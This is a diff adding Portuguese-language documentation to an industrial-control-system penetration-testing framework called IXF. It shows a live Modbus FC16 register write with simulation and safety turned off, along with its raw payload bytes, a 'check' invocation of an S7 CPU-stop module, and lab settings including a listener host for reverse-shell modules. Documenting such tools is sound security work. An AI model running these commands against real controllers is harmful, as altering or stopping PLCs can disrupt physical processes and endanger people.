@@ -914,3 +914,109 @@ O SafeMode é implementado em múltiplas camadas independentes para garantir que
 ---
 
 *Anterior: [Sistema de Módulos](04-sistema-modulos.md) | Próximo: [MITRE ATT&CK para ICS](06-mitre-attack-ics.md)*
+
+---
+
+## Exemplos Adicionais de Modulos por Nivel de Impacto
+
+### MEDIUM -- Sessao de Terminal Completa
+
+```
+ixf > use exploits/protocols/modbus/modbus_fc16_write_registers
+[*] Modulo carregado: Modbus FC16 Write Multiple Registers
+[*] CVE: N/A | Impacto: MEDIUM
+
+ixf (Modbus FC16 Write Multiple Registers) > show options
+  +------------+-----------+----------+----------------------------------------------+
+  | Opcao      | Valor     | Obrig.   | Descricao                                    |
+  | target     |           | sim      | IP do dispositivo Modbus                     |
+  | port       | 502       | nao      | Porta Modbus TCP                             |
+  | unit_id    | 1         | nao      | Modbus Unit ID (1-247)                       |
+  | start_addr | 0         | nao      | Endereco inicial do registrador              |
+  | quantity   | 1         | nao      | Numero de registradores a escrever           |
+  | values     | 0         | nao      | Valores a escrever (virgula-separado)        |
+  | simulate   | True      | nao      | Modo simulacao (padrao: True)                |
+  | destructive| False     | nao      | Modo destrutivo                              |
+  +------------+-----------+----------+----------------------------------------------+
+
+ixf (Modbus FC16 Write Multiple Registers) > set target 192.168.1.100
+ixf (Modbus FC16 Write Multiple Registers) > set start_addr 100
+ixf (Modbus FC16 Write Multiple Registers) > set values 1500
+ixf (Modbus FC16 Write Multiple Registers) > set simulate false
+ixf (Modbus FC16 Write Multiple Registers) > set destructive true
+ixf (Modbus FC16 Write Multiple Registers) > run
+
+  [!] AVISO DE IMPACTO MEDIO
+  Modulo: Modbus FC16 Write Multiple Registers
+  Alvo:   192.168.1.100:502
+  Impacto: MEDIUM -- modificacao de parametro de processo, reversivel
+
+  Pressione Enter para continuar ou Ctrl+C para abortar:
+[*] Executando escrita Modbus FC16...
+[*] Payload: 00 01 00 00 00 09 01 10 00 64 00 01 02 05 DC
+[+] Escrita FC16 confirmada: registrador 100 = 1500 em 192.168.1.100:502
+```
+
+### INFO -- Assessment Passivo
+
+```
+ixf > assess mitre_ics/coverage_report
+[*] Executando: Gerando relatorio de cobertura MITRE ATT&CK para ICS...
+[*] Modulo INFO -- apenas analise passiva, sem conexoes de rede
+
+[+] Layer ATT&CK Navigator gerado: ixf_mitre_layer_20260601.json
+[+] Relatorio de cobertura: 74/90 tecnicas (82%)
+[i] Abra o layer em: https://mitre-attack.github.io/attack-navigator/
+```
+
+---
+
+## Interacao com o Portao de Seguranca via Linha de Comando
+
+```bash
+# Modo seguro global -- todas as execucoes em simulacao
+ixf --simulate -c "ttp T0836 192.168.1.100"
+
+# Flag --simulate ignorada para modulos INFO/READ (sem efeito)
+ixf --simulate -c "assess mitre_ics/coverage_report"
+
+# Modo verificacao apenas (somente check())
+ixf -c "use exploits/protocols/s7comm/s7_stop_cpu; set target 192.168.1.50; check"
+```
+
+---
+
+*Anterior: [Sistema de Modulos](04-sistema-modulos.md) | Proximo: [MITRE ATT&CK para ICS](06-mitre-attack-ics.md)*
+
+---
+
+## Considerações de Segurança Operacional
+
+### Usando o IXF em Ambientes Regulados
+
+Em ambientes sujeitos a regulamentações como NERC CIP, ISO 27001, ou IEC 62443:
+
+1. **Documente a autorização** antes de qualquer teste
+2. **Notifique as partes interessadas** (operadores, proprietários de ativos)
+3. **Mantenha os logs de auditoria** do IXF como evidência de autorização
+4. **Coordene com sala de controle** para testes de alto impacto
+5. **Tenha um plano de rollback** documentado antes de qualquer `run` ao vivo
+
+### Configurações de Segurança Recomendadas para Laboratório
+
+```bash
+# Configuração recomendada para lab de segurança OT
+# No início de cada sessão de lab:
+ixf > setg simulate true    # Trava global de simulação
+ixf > setg lhost 10.0.0.1  # Host ouvinte (apenas para módulos de reverse)
+
+# Verificar configuração global antes de prosseguir
+ixf > show global
+
+# Quando pronto para teste ao vivo (apenas em lab, apenas em alvos autorizados):
+ixf > setg simulate false   # Libera modo ao vivo (com cautela)
+```
+
+---
+
+*Anterior: [Sistema de Módulos](04-sistema-modulos.md) | Próximo: [MITRE ATT&CK for ICS](06-mitre-attack-ics.md)*
